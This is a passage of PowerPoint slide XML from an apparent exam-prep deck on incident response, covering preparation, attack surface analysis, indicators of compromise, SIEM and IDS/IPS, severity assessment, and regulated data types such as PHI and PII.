              <a:t>•  On the exam: Expect items identifying preparation activities (hardening, patching, playbooks, training) and recognizing preparation as the proactive NIST phase distinct from detection or containment.</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652</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ACTIVE PREPARATION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Preparation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Prevent incidences to begin with</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  People</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Process</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Technology</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Network &amp; host hardening</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Patches &amp; updates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653</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ACTIVE PREPARATION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Active Security Measures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Active security measures center on knowing your own attack surface, meaning the complete set of points where an attacker could attempt to enter, interact with, or extract data from a system. Attack surface analysis is the practice of enumerating those exposed elements, such as open ports, exposed APIs, web forms, user inputs, network services, and trust boundaries, so the organization understands where it is reachable.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The main goal is to identify the key parts of a system that must be tested for vulnerabilities and then reduce or defend that exposure, which lets the security team anticipate likely attack paths and prioritize protection of the most critical assets. The same insight helps developers build more secure products by minimizing unnecessary exposure and validating the inputs attackers would target.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOC analysts care because you cannot monitor or defend what you have not mapped, and an unmanaged or growing attack surface is where breaches most often originate.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions on identifying an organization's attack surface and on how attack surface reduction proactively lowers exploitable exposure before an incident.</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654</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ACTIVE PREPARATION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Active Security Measures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Know Your Attack Surface</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Attack surface analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Main point: identify key parts of system to test for vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Help security team prepare for attacks &amp; protect assets</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Help developers make better products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655</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ACTIVE PREPARATION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Attack Surface Analysis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Attack surface analysis is a structured review, typically performed by security architects and penetration testers, that maps every avenue through which an adversary could reach or affect a system. It systematically identifies which parts of a system should be reviewed and tested for vulnerabilities and pinpoints the high-risk areas, such as internet-facing services, authentication endpoints, and privileged interfaces, that most need defensive attention.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A critical output is recognizing when the attack surface changes, for example after deploying a new service, opening a firewall rule, adding a cloud workload, or integrating a third party, since each change can introduce fresh exposure that existing controls do not cover. Comparing the current surface against a known baseline reveals this drift.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst uses attack surface analysis to focus scanning, monitoring, and hardening on the areas of greatest exposure and to trigger reassessment whenever the environment shifts, keeping defenses aligned with reality rather than an outdated snapshot.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Questions ask who conducts attack surface analysis, what it identifies, and why a change in the attack surface should prompt renewed testing and monitoring.</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656</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ACTIVE PREPARATION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Attack Surface Analysis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Conducted by security architects &amp; pen testers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Helps to identify:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Parts of a system to review &amp; test for vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  High risk areas that need to be defended</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  When attack surface changes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657</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ACTIVE PREPARATION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Detection &amp; Analysis – Know the Signs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This concept covers indicators of compromise (IoCs), the observable forensic artifacts that suggest a system may be under attack or already breached, which analysts learn to recognize during the detection and analysis phase. Common network and account signs include unusual outbound traffic, anomalous privileged or admin account activity, geographic irregularities such as logins from impossible-travel locations, and login irregularities like repeated failed attempts or off-hours access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Data-focused indicators include a spike in database read volume or an unusually large HTML response size, both of which can signal bulk data exfiltration, along with a high number of requests against the same file, which may indicate brute-forcing or scraping. Host and protocol indicators include mismatched port-to-application traffic, where a service runs on an unexpected port to evade detection, and suspicious changes to the registry or system files that point to persistence or tampering.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst memorizes these patterns because early, accurate recognition of IoCs is what separates a contained incident from a full-scale breach, and correlating several weak signals often reveals an attack that any single alert would miss.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect scenarios listing observed behavior (e.g., large outbound transfers, off-hours admin logins, mismatched port traffic) and asking you to identify it as an indicator of compromise.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658</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ACTIVE PREPARATION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Detection &amp; Analysis – Know the Signs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Indicators of compromise</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Unusual outbound traffic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Anomalous admin account activity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Geographic irregularities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Login irregularities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  High database read volume</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  HTML response size</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  High requests on the same file</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Mismatched port application traffic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Suspicious registry and system file changes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  DNS request anomalies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659</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ACTIVE PREPARATION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Detection &amp; Analysis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Detection and analysis is the NIST phase in which the team recognizes that an incident is occurring and determines its nature, scope, and severity, and its effectiveness depends on preparing reliable data sources in advance. Central to this is a SIEM (Security Information and Event Management) platform, which aggregates and correlates logs from across the environment so that related events are surfaced as a single actionable alert rather than scattered noise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Supporting sources include IDS/IPS sensors that flag or block known malicious network patterns, and the broad collection of alerts and logs from endpoints, firewalls, servers, and applications that provide the raw evidence for investigation. Well-tuned alerting reduces false positives so analysts can focus on genuine threats.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because you can only respond to what you can see; comprehensive, correlated, and properly retained log data is the foundation for validating an alert, reconstructing an attacker's actions, and scoping the incident accurately.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Questions test the role of the SIEM in correlating logs, the function of IDS/IPS, and why source preparation and log collection underpin the detection and analysis phase.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660</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ACTIVE PREPARATION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Detection &amp; Analysis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Prepare your sources</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  SIEM</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  IDS/IPS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Alerts &amp; logs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661</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ACTIVE PREPARATION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Determining Severity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Determining severity is the process of assessing an incident's business impact so responders can prioritize effort and escalate appropriately, rather than treating every event as equally urgent. Key dimensions include the scope of impact (how many systems, users, and services are affected), downtime measured against the maximum tolerable downtime the business can absorb, and recovery time, since prolonged outages translate directly into lost revenue on the principle that time is money.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Severity also weighs data integrity, meaning whether information has been tampered with or deleted, the economic impact reflecting the value and replacement cost of affected assets, and business process criticality, which asks how essential the disrupted function is to core operations. An incident hitting a revenue-generating or safety-critical process ranks far higher than one affecting a non-essential system.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst uses these factors to assign a priority that drives resource allocation and escalation, ensuring the most damaging incidents get immediate attention while lower-impact ones are handled proportionally.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions asking you to rank or prioritize incidents based on scope, downtime tolerance, data integrity, economic cost, and criticality of the affected business process.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662</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ACTIVE PREPARATION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Determining Severity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Scope of impact</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Downtime</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  What is the maximum tolerable downtime?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Recovery time</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Time is money</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Data integrity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Tampering or deleting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Economic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Value &amp; cost</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Business process criticality</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663</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ACTIVE PREPARATION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Types of Data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Understanding types of data matters because the classification and sensitivity of the information involved drive an incident's severity, notification obligations, and legal exposure. Regulated personal data includes PHI (Protected Health Information), governed by health-privacy laws, and PII (Personally Identifiable Information) that can identify an individual, both of which typically trigger mandatory breach-notification requirements when exposed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Payment card information falls under contractual standards such as PCI DSS, while corporate secrets and intellectual property, including patents, trademarks and copyright, trade secrets, accounting records, and merger-and-acquisition plans, represent high-value competitive and financial assets. Loss of any of these carries distinct regulatory, financial, or strategic consequences.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst identifies which data types are affected early in an incident because that determination dictates how severely the incident is rated, which regulators and stakeholders must be told, and how urgently containment must proceed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Questions test recognizing data classifications such as PHI, PII, and payment card data and matching a breach to the regulatory or notification obligations those data types impose.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664</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · IR ACTIVE PREPARATION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Types of Data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PHI (Protected Health Information)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  PII (Personally Identifiable Information)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Corporate secrets &amp; intellectual property</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Patents</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
